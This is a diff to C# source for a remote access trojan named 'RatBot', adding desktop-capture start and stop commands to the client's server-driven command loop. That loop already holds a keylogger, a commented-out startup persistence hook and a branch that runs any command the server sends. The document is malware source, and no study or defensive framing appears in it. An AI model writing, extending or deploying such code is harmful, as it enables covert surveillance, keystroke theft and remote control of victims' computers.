@@ -1,10 +1,8 @@
 ﻿//-- for further improvement: put all webclient in try-catch
 using System;
-using System.Collections.Generic;
-using System.Linq;
+
 using System.Net;
-using System.Text;
-using System.Threading.Tasks;
+
 using System.Windows.Forms;
 
 namespace RatBot
@@ -17,6 +15,7 @@ namespace RatBot
             ClientAdder.addNewClient(webClient);
             //ClientAdder.runAtStartup(); //--persistence
             ClientKeylogger.initClientKeylogger(); //--keylogger init but not started
+            ClientDesktop.initClientDesktop(); //--desktop capture init but not started
 
             while (true)
             {
@@ -53,7 +52,17 @@ namespace RatBot
                     //--do stop keylog function
                     ClientKeylogger.StopKeylogger();
                 }
-
+                //-- desktop capture --
+                else if (cmdFromServer.Contains("startdc"))
+                {
+                    //--do start desktop capture function
+                    ClientDesktop.StartDesktopCapture();
+                }
+                else if (cmdFromServer.Contains("stopdc"))
+                {
+                    //--do stop desktop capture function
+                    ClientDesktop.StopDesktopCapture();
+                }
                 else
                 {
                     string retString = Commands.Run(cmdFromServer);
